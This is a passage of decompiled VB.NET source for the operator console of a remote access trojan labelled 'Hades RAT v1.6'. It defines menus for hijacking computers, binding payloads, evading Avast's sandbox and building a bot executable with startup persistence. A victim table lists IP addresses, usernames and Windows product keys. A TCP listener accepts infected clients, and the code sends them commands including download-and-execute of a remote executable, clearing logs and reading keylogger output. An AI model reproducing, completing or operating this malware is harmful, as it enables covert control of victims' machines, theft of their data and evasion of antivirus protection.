            Me.ImageList1.Images.SetKeyName(&HEB, "Venezuela.png")
            Me.ImageList1.Images.SetKeyName(&HEC, "Viet Nam.png")
            Me.ImageList1.Images.SetKeyName(&HED, "Virgin Islands British.png")
            Me.ImageList1.Images.SetKeyName(&HEE, "Virgin Islands US.png")
            Me.ImageList1.Images.SetKeyName(&HEF, "Wales.png")
            Me.ImageList1.Images.SetKeyName(240, "Western Sahara.png")
            Me.ImageList1.Images.SetKeyName(&HF1, "Yemen.png")
            Me.ImageList1.Images.SetKeyName(&HF2, "Zambia.png")
            Me.MenuStrip1.BackColor = Color.FromArgb(&H40, &H40, &H40)
            Me.MenuStrip1.Font = New Font("Calibri", 9.75!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.MenuStrip1.Items.AddRange(New ToolStripItem() { Me.FileToolStripMenuItem, Me.ToolStripMenuItem2, Me.ServerEditorToolStripMenuItem, Me.BinderToolStripMenuItem, Me.ExtraToolStripMenuItem })
            Dim point As New Point(0, 0)
            Me.MenuStrip1.Location = point
            Me.MenuStrip1.Name = "MenuStrip1"
            Me.MenuStrip1.RenderMode = ToolStripRenderMode.Professional
            size = New Size(&H4BD, &H18)
            Me.MenuStrip1.Size = size
            Me.MenuStrip1.TabIndex = 4
            Me.MenuStrip1.Text = "MenuStrip1"
            Me.ToolStripMenuItem2.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.ToolStripMenuItem2.ForeColor = Color.Silver
            Me.ToolStripMenuItem2.Image = DirectCast(manager.GetObject("ToolStripMenuItem2.Image"), Image)
            Me.ToolStripMenuItem2.Name = "ToolStripMenuItem2"
            size = New Size(&H44, 20)
            Me.ToolStripMenuItem2.Size = size
            Me.ToolStripMenuItem2.Text = "Listen"
            Me.FileToolStripMenuItem.BackColor = Color.FromArgb(&H40, &H40, &H40)
            Me.FileToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.SettingsToolStripMenuItem, Me.NoipUpdateToolStripMenuItem, Me.ExitToolStripMenuItem })
            Me.FileToolStripMenuItem.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.FileToolStripMenuItem.ForeColor = Color.Silver
            Me.FileToolStripMenuItem.Image = DirectCast(manager.GetObject("FileToolStripMenuItem.Image"), Image)
            Me.FileToolStripMenuItem.Name = "FileToolStripMenuItem"
            size = New Size(&H38, 20)
            Me.FileToolStripMenuItem.Size = size
            Me.FileToolStripMenuItem.Text = "File"
            Me.SettingsToolStripMenuItem.Image = DirectCast(manager.GetObject("SettingsToolStripMenuItem.Image"), Image)
            Me.SettingsToolStripMenuItem.Name = "SettingsToolStripMenuItem"
            Me.SettingsToolStripMenuItem.ShortcutKeys = (Keys.Alt Or Keys.S)
            size = New Size(150, &H16)
            Me.SettingsToolStripMenuItem.Size = size
            Me.SettingsToolStripMenuItem.Text = "Settings"
            Me.NoipUpdateToolStripMenuItem.Image = Class5.smethod_65
            Me.NoipUpdateToolStripMenuItem.Name = "NoipUpdateToolStripMenuItem"
            size = New Size(150, &H16)
            Me.NoipUpdateToolStripMenuItem.Size = size
            Me.NoipUpdateToolStripMenuItem.Text = "No-ip Update"
            Me.ExitToolStripMenuItem.Image = DirectCast(manager.GetObject("ExitToolStripMenuItem.Image"), Image)
            Me.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem"
            Me.ExitToolStripMenuItem.ShortcutKeys = (Keys.Alt Or Keys.F4)
            size = New Size(150, &H16)
            Me.ExitToolStripMenuItem.Size = size
            Me.ExitToolStripMenuItem.Text = "Exit"
            Me.ServerEditorToolStripMenuItem.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.ServerEditorToolStripMenuItem.ForeColor = Color.Silver
            Me.ServerEditorToolStripMenuItem.Image = DirectCast(manager.GetObject("ServerEditorToolStripMenuItem.Image"), Image)
            Me.ServerEditorToolStripMenuItem.Name = "ServerEditorToolStripMenuItem"
            size = New Size(&H67, 20)
            Me.ServerEditorToolStripMenuItem.Size = size
            Me.ServerEditorToolStripMenuItem.Text = "Server Editor"
            Me.BinderToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.FormGrabberToolStripMenuItem })
            Me.BinderToolStripMenuItem.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.BinderToolStripMenuItem.ForeColor = Color.Silver
            Me.BinderToolStripMenuItem.Image = DirectCast(manager.GetObject("BinderToolStripMenuItem.Image"), Image)
            Me.BinderToolStripMenuItem.Name = "BinderToolStripMenuItem"
            size = New Size(&H45, 20)
            Me.BinderToolStripMenuItem.Size = size
            Me.BinderToolStripMenuItem.Text = "Plugin"
            Me.FormGrabberToolStripMenuItem.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.FormGrabberToolStripMenuItem.Image = DirectCast(manager.GetObject("FormGrabberToolStripMenuItem.Image"), Image)
            Me.FormGrabberToolStripMenuItem.Name = "FormGrabberToolStripMenuItem"
            size = New Size(&HA2, &H16)
            Me.FormGrabberToolStripMenuItem.Size = size
            Me.FormGrabberToolStripMenuItem.Text = "Hijack Computer"
            Me.ExtraToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.PortScannerToolStripMenuItem, Me.ResHackerToolStripMenuItem, Me.ExtensionChangerToolStripMenuItem, Me.BinderToolStripMenuItem1, Me.AntiAvastSandBoxToolStripMenuItem })
            Me.ExtraToolStripMenuItem.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.ExtraToolStripMenuItem.ForeColor = Color.Silver
            Me.ExtraToolStripMenuItem.Image = DirectCast(manager.GetObject("ExtraToolStripMenuItem.Image"), Image)
            Me.ExtraToolStripMenuItem.Name = "ExtraToolStripMenuItem"
            size = New Size(&H3D, 20)
            Me.ExtraToolStripMenuItem.Size = size
            Me.ExtraToolStripMenuItem.Text = "Extra"
            Me.PortScannerToolStripMenuItem.Image = DirectCast(manager.GetObject("PortScannerToolStripMenuItem.Image"), Image)
            Me.PortScannerToolStripMenuItem.Name = "PortScannerToolStripMenuItem"
            Me.PortScannerToolStripMenuItem.ShortcutKeys = (Keys.Alt Or Keys.P)
            size = New Size(&HB1, &H16)
            Me.PortScannerToolStripMenuItem.Size = size
            Me.PortScannerToolStripMenuItem.Text = "Port Scanner"
            Me.ResHackerToolStripMenuItem.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.ResHackerToolStripMenuItem.Image = Class5.smethod_19
            Me.ResHackerToolStripMenuItem.Name = "ResHackerToolStripMenuItem"
            size = New Size(&HB1, &H16)
            Me.ResHackerToolStripMenuItem.Size = size
            Me.ResHackerToolStripMenuItem.Text = "ResHacker"
            Me.ExtensionChangerToolStripMenuItem.Image = DirectCast(manager.GetObject("ExtensionChangerToolStripMenuItem.Image"), Image)
            Me.ExtensionChangerToolStripMenuItem.Name = "ExtensionChangerToolStripMenuItem"
            size = New Size(&HB1, &H16)
            Me.ExtensionChangerToolStripMenuItem.Size = size
            Me.ExtensionChangerToolStripMenuItem.Text = "Extension Changer"
            Me.BinderToolStripMenuItem1.Font = New Font("Calibri", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            Me.BinderToolStripMenuItem1.Image = Class5.smethod_17
            Me.BinderToolStripMenuItem1.Name = "BinderToolStripMenuItem1"
            size = New Size(&HB1, &H16)
            Me.BinderToolStripMenuItem1.Size = size
            Me.BinderToolStripMenuItem1.Text = "Binder"
            Me.AntiAvastSandBoxToolStripMenuItem.Image = Class5.smethod_42
            Me.AntiAvastSandBoxToolStripMenuItem.Name = "AntiAvastSandBoxToolStripMenuItem"
            size = New Size(&HB1, &H16)
            Me.AntiAvastSandBoxToolStripMenuItem.Size = size
            Me.AntiAvastSandBoxToolStripMenuItem.Text = "Anti Avast-SandBox"
            Me.txtListening.ForeColor = Color.DarkOrange
            Me.txtListening.Name = "txtListening"
            size = New Size(&H22, 20)
            Me.txtListening.Size = size
            Me.txtListening.Text = "Idle..."
            Me.ToolStripStatusLabel1.BackColor = Color.Transparent
            Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
            size = New Size(&H359, 20)
            Me.ToolStripStatusLabel1.Size = size
            Me.ToolStripStatusLabel1.Spring = True
            Me.StatusStrip1.BackColor = Color.Gainsboro
            Me.StatusStrip1.Items.AddRange(New ToolStripItem() { Me.txtOnline, Me.txtListening, Me.ToolStripStatusLabel1, Me.ToolStripSplitButton1, Me.ToolStripStatusLabel2 })
            point = New Point(0, 320)
            Me.StatusStrip1.Location = point
            Me.StatusStrip1.Name = "StatusStrip1"
            Me.StatusStrip1.RenderMode = ToolStripRenderMode.Professional
            size = New Size(&H4BD, &H19)
            Me.StatusStrip1.Size = size
            Me.StatusStrip1.TabIndex = 3
            Me.StatusStrip1.Text = "StatusStrip1"
            Me.txtOnline.BorderSides = ToolStripStatusLabelBorderSides.Right
            Me.txtOnline.Image = DirectCast(manager.GetObject("txtOnline.Image"), Image)
            Me.txtOnline.Name = "txtOnline"
            size = New Size(&H62, 20)
            Me.txtOnline.Size = size
            Me.txtOnline.Text = "Users Online: 0"
            Me.ToolStripSplitButton1.DisplayStyle = ToolStripItemDisplayStyle.Image
            Me.ToolStripSplitButton1.DropDownItems.AddRange(New ToolStripItem() { Me.NumberOfConnectionsMaxToolStripMenuItem, Me.ToolStripSeparator7, Me.ToolStripTextBox14 })
            Me.ToolStripSplitButton1.Image = DirectCast(manager.GetObject("ToolStripSplitButton1.Image"), Image)
            Me.ToolStripSplitButton1.ImageTransparentColor = Color.Magenta
            Me.ToolStripSplitButton1.Name = "ToolStripSplitButton1"
            size = New Size(&H20, &H17)
            Me.ToolStripSplitButton1.Size = size
            Me.ToolStripSplitButton1.Text = "pp"
            Me.NumberOfConnectionsMaxToolStripMenuItem.Image = Class5.smethod_72
            Me.NumberOfConnectionsMaxToolStripMenuItem.Name = "NumberOfConnectionsMaxToolStripMenuItem"
            size = New Size(&HD3, &H16)
            Me.NumberOfConnectionsMaxToolStripMenuItem.Size = size
            Me.NumberOfConnectionsMaxToolStripMenuItem.Text = "Number Of Connections (Max)"
            Me.ToolStripSeparator7.Name = "ToolStripSeparator7"
            size = New Size(&HD0, 6)
            Me.ToolStripSeparator7.Size = size
            Me.ToolStripTextBox14.Name = "ToolStripTextBox14"
            size = New Size(100, &H15)
            Me.ToolStripTextBox14.Size = size
            Me.ToolStripTextBox14.Text = "40"
            Me.ToolStripStatusLabel2.ForeColor = Color.Gray
            Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
            size = New Size(&HB1, 20)
            Me.ToolStripStatusLabel2.Size = size
            Me.ToolStripStatusLabel2.Text = "Copyright " & ChrW(169) & " The_Blood_Justice 2012"
            Me.ContextMenuStrip2.Items.AddRange(New ToolStripItem() { Me.SaveToFileToolStripMenuItem })
            Me.ContextMenuStrip2.Name = "ContextMenuStrip2"
            Me.ContextMenuStrip2.RenderMode = ToolStripRenderMode.System
            size = New Size(&H80, &H1A)
            Me.ContextMenuStrip2.Size = size
            Me.SaveToFileToolStripMenuItem.Image = DirectCast(manager.GetObject("SaveToFileToolStripMenuItem.Image"), Image)
            Me.SaveToFileToolStripMenuItem.Name = "SaveToFileToolStripMenuItem"
            size = New Size(&H7F, &H16)
            Me.SaveToFileToolStripMenuItem.Size = size
            Me.SaveToFileToolStripMenuItem.Text = "Save to File"
            Me.NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
            Me.NotifyIcon1.BalloonTipText = "Exemple"
            Me.NotifyIcon1.BalloonTipTitle = "ex"
            Me.NotifyIcon1.ContextMenuStrip = Me.ContextMenuStrip3
            Me.NotifyIcon1.Icon = DirectCast(manager.GetObject("NotifyIcon1.Icon"), Icon)
            Me.NotifyIcon1.Text = "Had" & ChrW(232) & "s RAT v1.6"
            Me.NotifyIcon1.Visible = True
            Me.ContextMenuStrip3.Items.AddRange(New ToolStripItem() { Me.ShowToolStripMenuItem, Me.ExitToolStripMenuItem1 })
            Me.ContextMenuStrip3.Name = "ContextMenuStrip3"
            Me.ContextMenuStrip3.RenderMode = ToolStripRenderMode.System
            size = New Size(100, &H30)
            Me.ContextMenuStrip3.Size = size
            Me.ShowToolStripMenuItem.Image = Class5.smethod_93
            Me.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem"
            size = New Size(&H63, &H16)
            Me.ShowToolStripMenuItem.Size = size
            Me.ShowToolStripMenuItem.Text = "Show"
            Me.ExitToolStripMenuItem1.Image = Class5.smethod_10
            Me.ExitToolStripMenuItem1.Name = "ExitToolStripMenuItem1"
            size = New Size(&H63, &H16)
            Me.ExitToolStripMenuItem1.Size = size
            Me.ExitToolStripMenuItem1.Text = "Exit"
            Me.Timer1.Enabled = True
            Me.Timer1.Interval = &HEA60
            point = New Point(&H142, -77)
            Me.getloggg.Location = point
            Me.getloggg.Multiline = True
            Me.getloggg.Name = "getloggg"
            size = New Size(&H124, &H42)
            Me.getloggg.Size = size
            Me.getloggg.TabIndex = 7
            Me.getloggg.Visible = False
            point = New Point(&H16, -195)
            Me.textsteam.Location = point
            Me.textsteam.Multiline = True
            Me.textsteam.Name = "textsteam"
            size = New Size(350, &HB8)
            Me.textsteam.Size = size
            Me.textsteam.TabIndex = 8
            point = New Point(0, -157)
            Me.RichTextBox3.Location = point
            Me.RichTextBox3.Name = "RichTextBox3"
            size = New Size(350, &H9A)
            Me.RichTextBox3.Size = size
            Me.RichTextBox3.TabIndex = 9
            Me.RichTextBox3.Text = ""
            point = New Point(&H1FA, -145)
            Me.RichTextBox4.Location = point
            Me.RichTextBox4.Name = "RichTextBox4"
            size = New Size(&HE4, &H86)
            Me.RichTextBox4.Size = size
            Me.RichTextBox4.TabIndex = 2
            Me.RichTextBox4.Text = ""
            Me.SideTab1.Alignment = TabAlignment.Left
            Me.SideTab1.Controls.Add(Me.TabPage1)
            Me.SideTab1.Controls.Add(Me.TabPage2)
            Me.SideTab1.Controls.Add(Me.TabPage4)
            Me.SideTab1.Controls.Add(Me.TabPage5)
            Me.SideTab1.Controls.Add(Me.TabPage3)
            Me.SideTab1.Dock = DockStyle.Fill
            Me.SideTab1.method_1(50)
            size = New Size(&H2C, &H88)
            Me.SideTab1.ItemSize = size
            point = New Point(0, &H18)
            Me.SideTab1.Location = point
            Me.SideTab1.Multiline = True
            Me.SideTab1.Name = "SideTab1"
            Me.SideTab1.SelectedIndex = 0
            size = New Size(&H4BD, &H128)
            Me.SideTab1.Size = size
            Me.SideTab1.SizeMode = TabSizeMode.Fixed
            Me.SideTab1.TabIndex = 5
            Me.TabPage1.BackColor = Color.White
            Me.TabPage1.Controls.Add(Me.RichTextBox2)
            Me.TabPage1.Controls.Add(Me.lstClients)
            point = New Point(140, 4)
            Me.TabPage1.Location = point
            Me.TabPage1.Name = "TabPage1"
            Dim padding As New Padding(3)
            Me.TabPage1.Padding = padding
            size = New Size(&H42D, &H120)
            Me.TabPage1.Size = size
            Me.TabPage1.TabIndex = 0
            Me.TabPage1.Text = "Connections"
            point = New Point(&H31, -135)
            Me.RichTextBox2.Location = point
            Me.RichTextBox2.Name = "RichTextBox2"
            size = New Size(100, &H60)
            Me.RichTextBox2.Size = size
            Me.RichTextBox2.TabIndex = 1
            Me.RichTextBox2.Text = ""
            Me.lstClients.BackColor = SystemColors.Window
            Me.lstClients.Columns.AddRange(New ColumnHeader() { Me.lstipaddress, Me.lstversion, Me.lststatus, Me.lstcpname, Me.lstusername, Me.lstwinprckey, Me.lstopsys, Me.lstcountry, Me.lstping })
            Me.lstClients.ContextMenuStrip = Me.ContextMenuStrip1
            Me.lstClients.Dock = DockStyle.Fill
            Me.lstClients.FullRowSelect = True
            point = New Point(3, 3)
            Me.lstClients.Location = point
            Me.lstClients.Name = "lstClients"
            size = New Size(&H427, &H11A)
            Me.lstClients.Size = size
            Me.lstClients.SmallImageList = Me.ImageList1
            Me.lstClients.Sorting = SortOrder.Ascending
            Me.lstClients.TabIndex = 0
            Me.lstClients.UseCompatibleStateImageBehavior = False
            Me.lstClients.View = View.Details
            Me.lstipaddress.Text = "IP Address"
            Me.lstipaddress.Width = 100
            Me.lstversion.Text = "Version"
            Me.lstversion.TextAlign = HorizontalAlignment.Center
            Me.lstversion.Width = 50
            Me.lststatus.Text = "Status"
            Me.lststatus.Width = &H9E
            Me.lstcpname.Text = "Computer Name"
            Me.lstcpname.Width = &H8A
            Me.lstusername.Text = "Username"
            Me.lstusername.Width = &H87
            Me.lstwinprckey.Text = "Windows Product Key"
            Me.lstwinprckey.Width = &H74
            Me.lstopsys.Text = "Operating System"
            Me.lstopsys.Width = &HAF
            Me.lstcountry.Text = "Country"
            Me.lstcountry.Width = &H8F
            Me.lstping.Text = "Ping"
            Me.lstping.Width = &H2C
            Me.TabPage2.BackColor = Color.White
            Me.TabPage2.Controls.Add(Me.ListView1)
            point = New Point(140, 4)
            Me.TabPage2.Location = point
            Me.TabPage2.Name = "TabPage2"
            padding = New Padding(3)
            Me.TabPage2.Padding = padding
            size = New Size(&H42D, &H120)
            Me.TabPage2.Size = size
            Me.TabPage2.TabIndex = 1
            Me.TabPage2.Text = "History"
            Me.ListView1.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader7, Me.ColumnHeader8 })
            Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip2
            Me.ListView1.Dock = DockStyle.Fill
            Me.ListView1.FullRowSelect = True
            Me.ListView1.GridLines = True
            point = New Point(3, 3)
            Me.ListView1.Location = point
            Me.ListView1.Name = "ListView1"
            size = New Size(&H427, &H11A)
            Me.ListView1.Size = size
            Me.ListView1.TabIndex = 0
            Me.ListView1.UseCompatibleStateImageBehavior = False
            Me.ListView1.View = View.Details
            Me.ColumnHeader7.Text = "Date and Time"
            Me.ColumnHeader7.Width = &H95
            Me.ColumnHeader8.Text = "Action"
            Me.ColumnHeader8.Width = &H326
            Me.TabPage4.BackColor = Color.White
            Me.TabPage4.Controls.Add(Me.Win8Progressbar1)
            Me.TabPage4.Controls.Add(Me.Button1)
            Me.TabPage4.Controls.Add(Me.CheckBox1)
            Me.TabPage4.Controls.Add(Me.Label2)
            Me.TabPage4.Controls.Add(Me.TextBox1)
            Me.TabPage4.Controls.Add(Me.PictureBox1)
            point = New Point(140, 4)
            Me.TabPage4.Location = point
            Me.TabPage4.Name = "TabPage4"
            size = New Size(&H42D, &H120)
            Me.TabPage4.Size = size
            Me.TabPage4.TabIndex = 3
            Me.TabPage4.Text = "Control from other device (iphone,android,ps3,psp ect..)"
            point = New Point(14, &H47)
            Me.Win8Progressbar1.Location = point
            Me.Win8Progressbar1.Name = "Win8Progressbar1"
            size = New Size(&H181, &H17)
            Me.Win8Progressbar1.Size = size
            Me.Win8Progressbar1.TabIndex = 5
            point = New Point(14, 100)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H181, &H2B)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 3
            Me.Button1.Text = ":: Build Bot.exe ::"
            Me.Button1.UseVisualStyleBackColor = True
            Me.CheckBox1.AutoSize = True
            point = New Point(&H12F, &H2E)
            Me.CheckBox1.Location = point
            Me.CheckBox1.Name = "CheckBox1"
            size = New Size(&H60, &H11)
            Me.CheckBox1.Size = size
            Me.CheckBox1.TabIndex = 2
            Me.CheckBox1.Text = "Add to startup"
            Me.CheckBox1.UseVisualStyleBackColor = True
            Me.Label2.AutoSize = True
            point = New Point(&H26, &H1C)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&HA7, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 1
            Me.Label2.Text = "Url of webpanel + /commandes/ :"
            point = New Point(14, &H2C)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(&H11B, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 0
            Me.TextBox1.Text = "http://www.webpanel.com/commandes/"
            Me.PictureBox1.Image = Class5.smethod_72
            point = New Point(&H15, &H19)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H10, &H10)
            Me.PictureBox1.Size = size
            Me.PictureBox1.TabIndex = 4
            Me.PictureBox1.TabStop = False
            Me.TabPage5.BackColor = Color.White
            Me.TabPage5.Controls.Add(Me.Button2)
            Me.TabPage5.Controls.Add(Me.TextBox2)
            Me.TabPage5.Controls.Add(Me.ComboBox1)
            point = New Point(140, 4)
            Me.TabPage5.Location = point
            Me.TabPage5.Name = "TabPage5"
            size = New Size(&H42D, &H120)
            Me.TabPage5.Size = size
            Me.TabPage5.TabIndex = 4
            Me.TabPage5.Text = "On-join"
            point = New Point(&H114, &H10)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&H4B, &H17)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 2
            Me.Button2.Text = "Ok"
            Me.Button2.UseVisualStyleBackColor = True
            point = New Point(11, &H12)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(100, &H15)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 1
            Me.TextBox2.Text = "Value"
            Me.ComboBox1.FormattingEnabled = True
            Me.ComboBox1.Items.AddRange(New Object() { "ping", "Download & Execute" })
            point = New Point(&H75, &H12)
            Me.ComboBox1.Location = point
            Me.ComboBox1.Name = "ComboBox1"
            size = New Size(&H99, &H15)
            Me.ComboBox1.Size = size
            Me.ComboBox1.TabIndex = 0
            Me.TabPage3.BackColor = Color.White
            point = New Point(140, 4)
            Me.TabPage3.Location = point
            Me.TabPage3.Name = "TabPage3"
            size = New Size(&H42D, &H120)
            Me.TabPage3.Size = size
            Me.TabPage3.TabIndex = 2
            Me.TabPage3.Text = "News / Info"
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            Me.BackColor = Color.FromArgb(&H40, &H40, &H40)
            size = New Size(&H4BD, &H159)
            Me.ClientSize = size
            Me.Controls.Add(Me.RichTextBox3)
            Me.Controls.Add(Me.RichTextBox4)
            Me.Controls.Add(Me.textsteam)
            Me.Controls.Add(Me.SideTab1)
            Me.Controls.Add(Me.getloggg)
            Me.Controls.Add(Me.StatusStrip1)
            Me.Controls.Add(Me.MenuStrip1)
            Me.DoubleBuffered = True
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MainMenuStrip = Me.MenuStrip1
            Me.Name = "Form1"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Had" & ChrW(232) & "s RAT v1.6"
            Me.ContextMenuStrip1.ResumeLayout(False)
            Me.MenuStrip1.ResumeLayout(False)
            Me.MenuStrip1.PerformLayout
            Me.StatusStrip1.ResumeLayout(False)
            Me.StatusStrip1.PerformLayout
            Me.ContextMenuStrip2.ResumeLayout(False)
            Me.ContextMenuStrip3.ResumeLayout(False)
            Me.SideTab1.ResumeLayout(False)
            Me.TabPage1.ResumeLayout(False)
            Me.TabPage2.ResumeLayout(False)
            Me.TabPage4.ResumeLayout(False)
            Me.TabPage4.PerformLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.TabPage5.ResumeLayout(False)
            Me.TabPage5.PerformLayout
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub IPAdressToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstipaddress.Width = Conversions.ToDouble("0")) Then
                Me.lstipaddress.Width = Conversions.ToInteger("100")
            Else
                Me.lstipaddress.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub KeyloggzeToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            MessageBox.Show("Keylogger Log is saved on C:\Documents and Settings\Administrateur\Application Data\critical.txt", "Keylogger", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        End Sub

        Private Sub KillToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_18.ShowDialog
                Class2.Class4_0.method_18.TextBox2.Focus
            End If
        End Sub

        Private Sub LanToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Public Sub Listen()
            Me.tcpListener_0 = New TcpListener(IPAddress.Any, Me.port)
            Me.tcpListener_0.Start
            Do While True
                Dim connection As New Connection(Me.tcpListener_0.AcceptTcpClient)
                AddHandler connection.GotInfo, New GotInfoEventHandler(AddressOf Me.GotInfo)
                AddHandler connection.Disconnected, New DisconnectedEventHandler(AddressOf Me.Disconnected)
            Loop
        End Sub

        Private Sub ListenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Not Me.listening Then
                Me.Invoke(New DelToggleListen(AddressOf Me.ToggleListen))
                Me.thread_0 = New Thread(New ThreadStart(AddressOf Me.Listen))
                Me.thread_0.IsBackground = True
                Me.thread_0.Start
                Me.Invoke(New RefreshDelegate(AddressOf Me.method_0))
            End If
        End Sub

        Private Sub ListToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_19.ShowDialog
            End If
        End Sub

        Public Function LookUpDetails(ByVal Address As String) As Object
            Dim lookup As New CountryLookup((Application.StartupPath & "\data\GeoIP.dat"))
            Dim str2 As String = Address
            Dim lookup2 As CountryLookup = lookup
            Return lookup2.LookupCountryName(str2)
        End Function

        Private Sub MatrixScreenToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("DL|http://mes-images.voila.net/matrix.exe")
            End If
        End Sub

        Private Sub MessageBoxToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_13.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("MSGBOX|", Class2.Class4_0.method_13._TEXT), "|"), Class2.Class4_0.method_13._TITLE), "|"), Class2.Class4_0.method_13._STYLE), "|"), Class2.Class4_0.method_13._BUTTON)))
            End If
        End Sub

        Public Sub method_0()
            If Me.listening Then
                Me.txtListening.ForeColor = Color.Green
                Me.txtListening.Text = ("Listening on Port: " & Conversions.ToString(Me.port))
            End If
        End Sub

        Private Sub method_1(ByVal sender As Object, ByVal e As KeyPressEventArgs)
            Dim num As Integer = Strings.Asc(e.KeyChar)
            If (((num < &H30) OrElse (num > &H39)) AndAlso (num <> 8)) Then
                e.Handled = True
            End If
        End Sub

        Private Sub method_10(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_11(ByVal sender As Object, ByVal e As EventArgs)
            Me.ToolStripMenuItem2.ForeColor = Color.Black
        End Sub

        Private Sub method_12(ByVal sender As Object, ByVal e As EventArgs)
            Me.ToolStripMenuItem2.ForeColor = Color.Silver
        End Sub

        Private Sub method_13(ByVal sender As Object, ByVal e As EventArgs)
            Me.ExtraToolStripMenuItem.ForeColor = Color.Black
        End Sub

        Private Sub method_14(ByVal sender As Object, ByVal e As EventArgs)
            Me.ExtraToolStripMenuItem.ForeColor = Color.Silver
        End Sub

        Private Sub method_15(ByVal sender As Object, ByVal e As EventArgs)
            Me.FileToolStripMenuItem.ForeColor = Color.Black
        End Sub

        Private Sub method_16(ByVal sender As Object, ByVal e As EventArgs)
            Me.FileToolStripMenuItem.ForeColor = Color.Silver
        End Sub

        Private Sub method_17(ByVal sender As Object, ByVal e As EventArgs)
            Me.ServerEditorToolStripMenuItem.ForeColor = Color.Black
        End Sub

        Private Sub method_18(ByVal sender As Object, ByVal e As EventArgs)
            Me.ServerEditorToolStripMenuItem.ForeColor = Color.Silver
        End Sub

        Private Sub method_19(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_2(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_20(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("WINBUGFENETRE")
            End If
        End Sub

        Private Sub method_21(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_22(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SKYPEONLINES")
            End If
        End Sub

        Private Sub method_23(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_24(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("DL|", Class2.Class4_0.method_4.URL)))
            End If
        End Sub

        Private Sub method_25(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_26(ByVal sender As Object, ByVal e As EventArgs)
            Me.SendToSelected("CLEARLOG")
        End Sub

        Private Sub method_3(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_4(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_5(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Interaction.Shell("data\Hades_stub.exe", AppWinStyle.MinimizedFocus, False, -1)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                MessageBox.Show("Error, file missing....", "Error of Antivirus", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                Application.Exit
                ProjectData.ClearProjectError
            End Try
